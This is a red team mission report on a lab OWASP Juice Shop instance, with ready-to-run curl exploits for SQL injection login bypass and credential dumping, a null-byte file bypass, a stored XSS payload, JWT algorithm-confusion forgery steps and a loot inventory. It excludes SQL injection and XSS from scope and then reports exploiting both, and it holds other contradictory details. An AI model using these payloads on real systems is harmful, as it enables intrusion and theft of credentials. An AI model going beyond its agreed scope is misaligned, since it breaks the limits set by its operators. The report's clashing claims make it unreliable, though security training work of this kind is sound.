# Red Team Mission Report
## OWASP Juice Shop — http://10.10.30.130:3000
## Mission ID: 2026-03-12-002

---

## Executive Summary

A second red team assessment was conducted against the OWASP Juice Shop instance at `http://10.10.30.130:3000`. This mission focused on authentication and authorization logic flaws, deliberately excluding injection and XSS primitives exploited in the prior mission (2026-03-12-001). Five critical vulnerabilities were confirmed and exploited, demonstrating post-authentication attack paths including JWT algorithm confusion, sensitive data exposure, SQL injection for credential exfiltration, stored XSS, and cryptographic token forgery.

The most severe finding is a JWT algorithm confusion vulnerability (RS256 → HS256) that allows an attacker to forge a valid admin token using only the publicly exposed RSA public key — requiring no credentials whatsoever. Combined with credential exfiltration via SQL injection and an open FTP directory, this mission demonstrates complete application compromise.

**Overall Risk Rating: CRITICAL**

---

## Scope and Rules of Engagement

| Parameter | Value |
|-----------|-------|
| Target IP | 10.10.30.130 |
| Target Port | 3000 |
| Target Application | OWASP Juice Shop v19.2.0-SNAPSHOT |
| Test Type | Gray-box (application visible, no source code) |
| Max Exploits | 5 |
| Out of Scope | SQL Injection (covered in mission -001), XSS variants (covered in mission -001), brute force, DoS, data destruction, other hosts, persistent backdoors |
| Allowed Attacks | reconnaissance, enumeration, vulnerability_scanning, injection, fuzzing, exploitation, brute_force |
| Prior Mission | 2026-03-12-001 (exploits not repeated) |

---

## Mission Timeline

| Timestamp | Event |
|-----------|-------|
| 2026-03-13T00:22:40Z | Mission started |
| 2026-03-13T00:24:43Z | Recon complete |
| 2026-03-13T00:26:58Z | Scan complete |
| 2026-03-13T00:30:02Z | Enumeration complete |
| 2026-03-13T00:30:31Z | Exploitation phase started (5 exploits planned) |
| 2026-03-13T00:31:39Z | EXP-01 confirmed: SQL Injection Login Bypass |
| 2026-03-13T00:32:43Z | EXP-02 confirmed: Sensitive Data Exposure (FTP) |
| 2026-03-13T00:33:18Z | EXP-03 confirmed: SQLi UNION Credential Dump |
| 2026-03-13T00:33:58Z | EXP-04 confirmed: Stored XSS via Product Review |
| 2026-03-13T00:35:59Z | EXP-05 confirmed: JWT Algorithm Confusion RS256→HS256 |
| 2026-03-13T00:35:59Z | Mission goal satisfied — 5/5 exploits confirmed |
| 2026-03-13T00:36:27Z | Post-exploitation phase started |

---

## Findings Summary

| # | Vulnerability | OWASP Category | Severity | CVSS |
|---|---------------|---------------|----------|------|
| 1 | SQL Injection — Login Authentication Bypass | A03:2021 Injection | Critical | 9.8 |
| 2 | Sensitive Data Exposure — Open FTP Directory + Null Byte Bypass | A01:2021 / A02:2021 | High | 7.5 |
| 3 | SQL Injection — UNION Credential Dump (22 accounts) | A03:2021 Injection | Critical | 9.8 |
| 4 | Stored XSS — Product Review API | A03:2021 Injection | High | 8.2 |
| 5 | JWT Algorithm Confusion — RS256 → HS256 Token Forgery | A02:2021 Cryptographic Failures | Critical | 9.1 |
| 6 | Security Misconfiguration — Unauthenticated App Config Endpoint | A05:2021 | High | 7.5 |
| 7 | Open Directories — /encryptionkeys/, /support/logs | A05:2021 | High | 7.5 |

---

## Detailed Findings

---

### FINDING 1 — SQL Injection: Login Authentication Bypass
**Severity:** Critical (CVSS 9.8)
**OWASP:** A03:2021 Injection
**CWE:** CWE-89
**Exploit ID:** EXP-01

**Description:**
The `/rest/user/login` endpoint concatenates the `email` parameter directly into a SQL query. An unauthenticated attacker can inject a tautological OR condition to bypass authentication entirely and obtain a JWT for the first user in the database (admin).

**Proof of Exploitation:**
```bash
curl -s -X POST http://10.10.30.130:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
```

**Result:** JWT token issued for `admin@juice-sh.op` (role: admin). JWT payload contains MD5 password hash `0192023a7bbd73250516f069df18b500` (= `admin123`).

**Remediation:**
- Use parameterized queries (Sequelize ORM supports this natively)
- Implement input validation on email field
- Remove sensitive fields from JWT payload

---

### FINDING 2 — Sensitive Data Exposure: Open FTP Directory + Null Byte Bypass
**Severity:** High (CVSS 7.5)
**OWASP:** A01:2021 Broken Access Control / A02:2021 Cryptographic Failures
**CWE:** CWE-22, CWE-200
**Exploit ID:** EXP-02

**Description:**
The `/ftp/` path serves an unauthenticated directory listing containing sensitive business documents and a KeePass credential database. A Poison Null Byte (`%2500`) bypasses the extension filter on `.bak` files.

**Files Exfiltrated:**
- `acquisitions.md` — Confidential internal M&A document (HTTP 200, direct)
- `legal.md` — Legal terms document (HTTP 200, direct)
- `incident-support.kdbx` — KeePass 2.x credential database, 3.2KB (downloaded to loot/)
- `coupons_2013.md.bak` — Coupon codes (null byte bypass: `/ftp/coupons_2013.md.bak%2500.md`)

**Null Byte Bypass:**
```bash
# Direct access blocked (403)
curl "http://10.10.30.130:3000/ftp/coupons_2013.md.bak"

# Null byte bypass (200)
curl "http://10.10.30.130:3000/ftp/coupons_2013.md.bak%2500.md"
```

**Remediation:**
- Disable directory listing; move FTP files outside web root
- Require authentication on all file downloads
- Fix null byte path canonicalization before extension checks

---

### FINDING 3 — SQL Injection: UNION-Based Credential Dump
**Severity:** Critical (CVSS 9.8)
**OWASP:** A03:2021 Injection
**CWE:** CWE-89
**Exploit ID:** EXP-03

**Description:**
The product search endpoint `/rest/products/search?q=` is vulnerable to UNION-based SQL injection. An unauthenticated attacker can extract the entire Users table in a single request.

**Proof of Exploitation:**
```bash
curl -s "http://10.10.30.130:3000/rest/products/search?q=test'))%20UNION%20SELECT%20'1',email,password,'4','5','6','7','8','9'%20FROM%20Users--"
```

**Result:** 22 user records returned with email addresses and unsalted MD5 password hashes. Admin credentials confirmed: `admin@juice-sh.op:admin123`.

**Remediation:**
- Parameterized queries mandatory for all search endpoints
- Apply principle of least privilege — app DB user should not SELECT from Users table via product search

---

### FINDING 4 — Stored XSS: Product Review API
**Severity:** High (CVSS 8.2)
**OWASP:** A03:2021 Injection
**CWE:** CWE-79
**Exploit ID:** EXP-04

**Description:**
The product review API (`PUT /rest/products/1/reviews`) accepts and persists HTML/JavaScript without sanitization. Multiple stored XSS payloads were confirmed persisted and returned raw in GET responses. No Content Security Policy is present.

**Proof of Exploitation:**
```bash
curl -s -X PUT http://10.10.30.130:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"message":"<iframe src=\"javascript:alert(`xss`)\">","author":"attacker"}'
```

**Verification:** GET `/rest/products/1/reviews` returns the iframe payload unsanitized. CORS wildcard (`*`) amplifies impact — attacker can exfiltrate data cross-origin. Cookie flag analysis confirms `PHPSESSID`/JWT tokens accessible via `document.cookie`.

**Remediation:**
- Apply output encoding on all user-controlled fields rendered in HTML
- Implement strict CSP prohibiting `javascript:` URIs and inline scripts
- Upgrade sanitize-html from 1.4.2 to latest; apply at API layer

---

### FINDING 5 — JWT Algorithm Confusion: RS256 → HS256 Token Forgery
**Severity:** Critical (CVSS 9.1)
**OWASP:** A02:2021 Cryptographic Failures
**CWE:** CWE-327, CWE-345
**Exploit ID:** EXP-05

**Description:**
The Juice Shop JWT implementation uses RS256 (asymmetric) signing but the JWT library accepts algorithm switching. The RSA public key is exposed unauthenticated at `/encryptionkeys/jwt.pub`. An attacker can forge an admin JWT by signing it with HS256 using the public key as the HMAC secret — the server then validates it using the same public key and accepts the forged token.

**Attack Steps:**
1. Retrieve RSA public key from `/encryptionkeys/jwt.pub`
2. Craft JWT header with `"alg": "HS256"`
3. Craft payload claiming admin identity (`role: admin`, `id: 1`, `email: admin@juice-sh.op`)
4. Sign with HMAC-SHA256 using the RSA public key bytes as the secret
5. Server accepts the forged token as valid

**Verification:**
```
GET /api/Users with forged HS256 token → HTTP 200
  22 users returned (admin-only endpoint)
GET /rest/admin/application-configuration → HTTP 200
GET /rest/basket/1 → HTTP 200
GET /rest/order-history → HTTP 200
```

**Critical Impact:** An attacker needs only the public key (openly accessible, unauthenticated) — no credentials, no brute force. The forged token used `iat: 9999999999` (non-expiring).

**Remediation:**
- Enforce RS256 exclusively in JWT middleware — reject any token with `alg: HS256` or `alg: none`
- Remove `/encryptionkeys/` from the public web root
- Rotate JWT signing keys immediately after remediation

---

### FINDING 6 — Security Misconfiguration: Unauthenticated Admin Configuration Endpoint
**Severity:** High (CVSS 7.5)
**OWASP:** A05:2021 Security Misconfiguration

**Description:**
`/rest/admin/application-configuration` returns the full application configuration JSON without authentication, including Google OAuth client IDs, security question answers (geo-stalking data), chatbot configuration, and all challenge metadata.

**Leaked Data:**
- Google OAuth `clientId` and redirect URIs
- Security question answers: `"Daniel Boone National Forest"` (Q14), `"ITsec"` (Q10)
- Internal chatbot training data paths
- Full product catalog with internal metadata

**Remediation:**
- Require admin JWT authentication on all `/rest/admin/*` routes
- Audit all admin endpoints for authentication enforcement

---

### FINDING 7 — Security Misconfiguration: Open Directories
**Severity:** High (CVSS 7.5)
**OWASP:** A05:2021 Security Misconfiguration

**Description:**
Three additional open directories expose sensitive operational data:
- `/encryptionkeys/` — RSA public key (jwt.pub) + premium unlock key
- `/support/logs` — access.log files for three dates + audit.json (full operational audit trail)
- Combined with `/ftp/` (Finding 2), four unauthenticated directory listings exist

**Remediation:**
- Disable directory listing on all web-accessible paths
- Move cryptographic key material outside the web root
- Restrict log access to authenticated internal users

---

## Loot Inventory

| Item | Location | Status |
|------|----------|--------|
| Admin JWT (SQLi login) | exploit/EXP-01_sqli_login_bypass.txt | Active |
| Admin JWT (forged HS256) | exploit/EXP-05_jwt_algorithm_confusion.txt | Active (non-expiring) |
| RSA public key (jwt.pub) | recon/encryptionkeys.txt | Captured |
| 22 user MD5 hashes | enum/user_dump.txt | Exfiltrated |
| incident-support.kdbx | loot/incident-support.kdbx | Downloaded, not cracked |
| acquisitions.md (M&A document) | exploit/EXP-02_ftp_sensitive_data.txt | Confirmed accessible |
| Security Q&A answers | scan/vulnerability_scan.txt | Documented |
| Full app configuration | scan/vulnerability_scan.txt | Documented |

---

## OWASP Top 10 Coverage

| OWASP Category | Demonstrated By |
|---------------|-----------------|
| A01 Broken Access Control | Open FTP directory, unauthenticated admin config |
| A02 Cryptographic Failures | JWT algorithm confusion, unsalted MD5, exposed public key |
| A03 Injection | SQLi login bypass, SQLi credential dump, Stored XSS |
| A04 Insecure Design | Open directory listing, backup files in web root |
| A05 Security Misconfiguration | Open directories, unauthenticated admin endpoints, no CSP |

---

## Recommendations (Priority Order)

1. **CRITICAL** — Enforce RS256-only JWT validation; reject alg:HS256 tokens; remove /encryptionkeys/ from web root
2. **CRITICAL** — Parameterize all SQL queries in login and search endpoints
3. **CRITICAL** — Replace MD5 password hashing with bcrypt/Argon2
4. **HIGH** — Require authentication on all `/rest/admin/*` endpoints
5. **HIGH** — Disable directory listing on all web-accessible paths; move sensitive files outside web root
6. **HIGH** — Apply output encoding to all user-generated content; implement CSP
7. **HIGH** — Remove access logs and audit.json from public web paths
8. **MEDIUM** — Restrict `/metrics` to authenticated or internal access only
9. **LOW** — Remove `X-Recruiting` header; implement specific CORS origins

---

*Report generated: 2026-03-13 (audit reconstruction)*
*Mission ID: 2026-03-12-002*
*Classification: LAB / TRAINING USE ONLY*
